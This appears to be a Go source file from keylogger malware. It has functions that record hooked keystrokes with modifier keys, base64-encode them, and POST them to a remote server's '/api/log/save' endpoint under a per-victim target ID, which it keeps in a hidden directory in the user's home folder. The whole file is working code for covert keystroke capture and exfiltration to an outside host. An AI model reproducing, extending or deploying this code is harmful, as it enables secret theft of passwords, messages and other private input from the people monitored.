package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	hook "github.com/robotn/gohook"
)

type KeyboardDataStruct struct {
	Contents []string `json:"_"`
}

type DataUploadRequestBody struct {
	Clipboard []string `json:"c"`
	Data      string   `json:"d"`
	TargetID  string   `json:"t"`
	Timestamp int64    `json:"ts"`
}

type ResponseStruct struct {
	ID string `json:"id"`
}

func getTargetID() string {
	userHome, err := os.UserHomeDir()
	if err != nil {
		log.Panicf("Error: %s", err.Error())
	}

	confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
	createHiddenDirectory(confDir)

	confFile := filepath.Join(confDir, ".tid")

	targetID, err := os.ReadFile(confFile)
	if os.IsNotExist(err) {
		return ""
	}
	if err != nil && !os.IsNotExist(err) {
		log.Panicf("Error: %s", err.Error())
	}

	return string(targetID)
}

func writeToLocalStruct(
	event hook.Event,
	value string,
	localStruct *KeyboardDataStruct,
) {
	modifiers := getModifiers(event)
	modifiersList := strings.Join(modifiers, "+")
	if len(modifiers) > 0 {
		modifiersList += "+"
	}

	localStruct.Contents = append(localStruct.Contents,
		fmt.Sprintf("%s%s", modifiersList, value))
}

func encodeUploadData(data KeyboardDataStruct, targetID string) []byte {
	dataStr, err := json.Marshal(data)
	if err != nil {
		log.Panicf("Error while marshalling data: %s", err.Error())
	}

	b64str := base64.StdEncoding.EncodeToString(dataStr)
	var keyData DataUploadRequestBody = DataUploadRequestBody{
		Clipboard: []string{},
		Data:      b64str,
		Timestamp: time.Now().UnixMilli(),
	}

	if len(targetID) > 0 {
		keyData.TargetID = targetID
	}

	jsonStr, err := json.Marshal(keyData)
	if err != nil {
		log.Panicf("Error while marshalling key data: %s", err.Error())
	}

	return jsonStr
}

func uploadData(encodedData []byte) {
	apiEndpoint := fmt.Sprintf("%s/api/log/save", REMOTE_API_SERVER_URL)

	req, err := http.NewRequest("POST", apiEndpoint, bytes.NewBuffer(encodedData))
	if err != nil {
		log.Panicf("Error while trying to create HTTP request: %s", err.Error())
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	// see comments on https://stackoverflow.com/a/24455606
	client.Timeout = time.Second * 10
	res, err := client.Do(req)
	if err != nil {
		log.Panicf("Error while trying to upload data: %s", err.Error())
	}
	defer res.Body.Close()

	if res.StatusCode != 200 {
		log.Panicf("Error: unknown error")
	}

	resBody, _ := io.ReadAll(res.Body)
	if len(resBody) > 0 {
		userHome, err := os.UserHomeDir()
		if err != nil {
			log.Panicf("Error: %s", err.Error())
		}

		confDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
		createHiddenDirectory(confDir)

		confFile := filepath.Join(confDir, ".tid")
		resStruct := ResponseStruct{}
		err = json.Unmarshal(resBody, &resStruct)
		if err != nil {
			log.Panicf("Error while unmarshalling response: %s", err.Error())
		}

		idDecoded, err := base64.StdEncoding.DecodeString(resStruct.ID)
		if err != nil {
			log.Panicf("Error while decoding ID: %s", err.Error())
		}

		if len(resStruct.ID) > 0 {
			err = os.WriteFile(confFile, idDecoded, 0644)
			if err != nil {
				log.Panicf("Error while writing target ID to file: %s", err.Error())
			}
		}
	}
}
